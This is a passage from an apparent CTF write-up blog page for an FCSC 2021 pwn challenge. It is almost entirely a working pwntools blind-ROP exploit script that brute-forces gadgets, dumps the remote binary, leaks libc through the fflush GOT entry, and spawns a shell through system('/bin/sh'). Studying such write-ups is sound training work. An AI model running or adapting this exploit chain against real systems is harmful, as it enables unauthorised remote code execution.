class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">STOP_GADGETS = [<span class="number">0x400668</span>]</span><br><span class="line"></span><br><span class="line">CSU_POP = <span class="number">0x40073a</span></span><br><span class="line">POP_RDI = CSU_POP+<span class="number">0x9</span></span><br><span class="line">POP_RSI_R15 = CSU_POP+<span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">GADGET_LEAK = <span class="number">0x400510</span></span><br><span class="line">FFLUSH_GOT = <span class="number">0x400000</span> + <span class="number">0x200FF0</span></span><br><span class="line">FFLUSH_OFFSET = <span class="number">0x069ab0</span></span><br><span class="line">OFFT_BINSH = <span class="number">0x1633e8</span></span><br><span class="line"></span><br><span class="line">SYSTEM = <span class="number">0x041490</span> </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">__libc_start_main 	0x021a50 	0x0</span></span><br><span class="line"><span class="string">system 	0x041490 	0x1fa40</span></span><br><span class="line"><span class="string">fflush 	0x069ab0 	0x48060</span></span><br><span class="line"><span class="string">open 	0x0db950 	0xb9f00</span></span><br><span class="line"><span class="string">read 	0x0dbb90 	0xba140</span></span><br><span class="line"><span class="string">write 	0x0dbbf0 	0xba1a0</span></span><br><span class="line"><span class="string">str_bin_sh 	0x1633e8 	0x141998</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&quot;challenges2.france-cybersecurity-challenge.fr&quot;</span>, <span class="number">4008</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padd</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s + <span class="string">b&quot;\x00&quot;</span>*(<span class="number">8</span>-(<span class="built_in">len</span>(s) % <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpadd</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">b&quot;\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_crash</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> (<span class="built_in">len</span>(s) == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_stop</span>(<span class="params">s, ip, padding</span>):</span><br><span class="line">    <span class="keyword">return</span> (ip <span class="keyword">not</span> <span class="keyword">in</span> STOP_GADGETS) <span class="keyword">and</span> (s == <span class="string">b&quot;Thanks &quot;</span> + padding + unpadd(p64(ip)) + <span class="string">b&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jmp</span>(<span class="params">av</span>):</span><br><span class="line">    io = start()</span><br><span class="line">    io.write(av)</span><br><span class="line">    <span class="keyword">return</span> io.recvall(timeout=<span class="number">5.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_padding</span>(<span class="params">p=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">    padding = p + <span class="string">b&quot;\x90&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] sending: <span class="subst">&#123;padding&#125;</span>&quot;</span>)</span><br><span class="line">    resp = jmp(padding)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] recv: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&quot;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks &quot;</span> + padding <span class="keyword">in</span> resp:</span><br><span class="line">        <span class="keyword">return</span> find_padding(p=padding)</span><br><span class="line">    <span class="keyword">return</span> padding[:<span class="built_in">len</span>(padding)-<span class="number">1</span>] <span class="comment"># minus one char because we do not want that padding overwrite the return address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak2</span>(<span class="params">padding: <span class="built_in">str</span>, leak1=<span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        buf = padding + leak1 + p8(i)</span><br><span class="line">        resp = try_jmp(buf)</span><br><span class="line">        <span class="comment"># print(f&quot;Trying on &#123;hex(int.from_bytes(leak1+p8(i), &#x27;little&#x27;) &lt;&lt; (64 - counter*8))&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(resp):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(padd(leak1+p8(i)), <span class="string">&#x27;little&#x27;</span>))&#125;</span>] Output: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(leak1) &lt; <span class="number">8</span>:</span><br><span class="line">                leak2(padding, leak1=leak1+p8(i))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> leak1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leak1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak2_opti</span>(<span class="params">padding: <span class="built_in">str</span></span>):</span><br><span class="line">    base = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2000</span>):</span><br><span class="line">        buf = padding + p64(base+i)</span><br><span class="line">        resp = try_jmp(buf)</span><br><span class="line">        <span class="comment"># print(f&quot;Trying on &#123;hex(int.from_bytes(leak1+p8(i), &#x27;little&#x27;) &lt;&lt; (64 - counter*8))&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(resp):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">hex</span>(base+i)&#125;</span>] Output: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> leak1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_brop</span>(<span class="params">padding</span>):</span><br><span class="line">    base = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x2000</span>):</span><br><span class="line">        buf = padding + p64(base + i) + p64(<span class="number">0xdeadbeef</span>) * <span class="number">6</span> + p64(STOP_GADGETS[<span class="number">0</span>])</span><br><span class="line">        resp = try_jmp(buf)</span><br><span class="line">        <span class="keyword">if</span> is_stop(resp, base+i, padding):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Output: <span class="subst">&#123;resp&#125;</span>, leak: <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(p64(base + i), <span class="string">&#x27;little&#x27;</span>))&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i % <span class="number">35</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;_ - <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base + i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_binary</span>(<span class="params">padding, base</span>):</span><br><span class="line">    gadget_leak = <span class="number">0x400510</span></span><br><span class="line">    i = <span class="number">0</span> </span><br><span class="line">    buf = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">b&quot;Thanks &quot;</span> + padding + unpadd(p64(POP_RDI))</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;leet_dump.bin&quot;</span>, <span class="string">&quot;ab&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> base+i &lt; <span class="number">0x400fff</span>:</span><br><span class="line">        resp1 = try_jmp(padding + p64(POP_RDI) + p64(base+i) + p64(POP_RSI_R15) + p64(<span class="number">0x0</span>)*<span class="number">2</span> + p64(gadget_leak) + p64(STOP_GADGETS[<span class="number">0</span>]) + p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(resp1):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        leak = resp1[<span class="built_in">len</span>(pattern):resp1.index(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(leak):</span><br><span class="line">            buf += <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] recv @ <span class="subst">&#123;<span class="built_in">hex</span>(base+i)&#125;</span>: 0x00&quot;</span>)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            buf += leak</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] recv @ <span class="subst">&#123;<span class="built_in">hex</span>(base+i)&#125;</span>: <span class="subst">&#123;leak.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            i = i + <span class="built_in">len</span>(leak)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(buf) &gt;= <span class="number">0x100</span>:</span><br><span class="line">            f.write(buf)</span><br><span class="line">            buf = <span class="string">b&quot;&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Buffering ..&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_plt</span>(<span class="params">padding</span>):</span><br><span class="line">    base = <span class="number">0x400000</span> </span><br><span class="line">    s = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x0</span>, <span class="number">0x3000</span>, <span class="number">0x10</span>):</span><br><span class="line">        resp1 = try_jmp(padding + p64(POP_RDI) + p64(<span class="number">0x400000</span>) + p64(POP_RSI_R15) + p64(<span class="number">0x400000</span>)*<span class="number">2</span> + p64(base+i) + p64(STOP_GADGETS[<span class="number">0</span>]) + p64(<span class="number">0xdeadbeef</span>)) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_stop(resp1, base+i, padding):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Output: <span class="subst">&#123;resp1.<span class="built_in">hex</span>()&#125;</span>, leak: <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(p64(base + i), <span class="string">&#x27;little&#x27;</span>))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(resp1):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="built_in">hex</span>(base+i)&#125;</span>] Out: <span class="subst">&#123;resp1.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_jmp</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = start()</span><br><span class="line">            io.write(s)</span><br><span class="line">            resp = io.recv(<span class="number">500</span>, timeout=<span class="number">30.0</span>)[<span class="number">35</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;STOP: <span class="subst">&#123;sys.exc_info()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            resp = -<span class="number">1</span> </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_jmp_flow</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = start()</span><br><span class="line">            io.write(s)</span><br><span class="line">            resp = io.recv(<span class="number">500</span>, timeout=<span class="number">30.0</span>)[<span class="number">35</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;STOP: <span class="subst">&#123;sys.exc_info()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            resp = -<span class="number">1</span> </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> resp, io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flow</span>(<span class="params">padding</span>):</span><br><span class="line">    payload = av</span><br><span class="line">    payload += p64(POP_RDI)</span><br><span class="line">    payload += p64(FFLUSH_GOT)</span><br><span class="line">    payload += p64(POP_RSI_R15) + p64(<span class="number">0xffffffffffffffff</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(GADGET_LEAK)</span><br><span class="line">    payload += p64(<span class="number">0x400000</span> + <span class="number">0x656</span>) <span class="comment"># ret2main</span></span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">b&quot;Thanks &quot;</span> + padding + unpadd(p64(POP_RDI))</span><br><span class="line">    resp_tmp, io = try_jmp_flow(payload)</span><br><span class="line">    <span class="built_in">print</span>(resp_tmp)</span><br><span class="line">    leak_fflush = <span class="built_in">int</span>.from_bytes(resp_tmp[<span class="built_in">len</span>(pattern):resp_tmp.index(<span class="string">b&#x27;What is&#x27;</span>)], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc = leak_fflush - FFLUSH_OFFSET </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;libc @ <span class="subst">&#123;<span class="built_in">hex</span>(libc)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = av</span><br><span class="line">    payload += p64(POP_RDI)</span><br><span class="line">    payload += p64(libc + OFFT_BINSH)</span><br><span class="line">    payload += p64(libc + SYSTEM)</span><br><span class="line"></span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">flow(<span class="string">&quot;a&quot;</span>*<span class="number">40</span>)</span><br><span class="line"><span class="comment"># FCSC&#123;3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28&#125;</span></span><br></pre></td></tr></table></figure>

<p>Thanks to the creator of this very interesting challenge !</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/posts/pwnasis/"
      title="[ASIS CTF QUALS 2021 - pwn] abbr & justpwnit"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        [ASIS CTF QUALS 2021 - pwn] abbr &amp; justpwnit
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/posts/mipsy/"
      title="[FCSC 2021 - pwn] Itsy Mipsy router"
     >

    <p class="title-text">
      
        [FCSC 2021 - pwn] Itsy Mipsy router
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 nasm<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
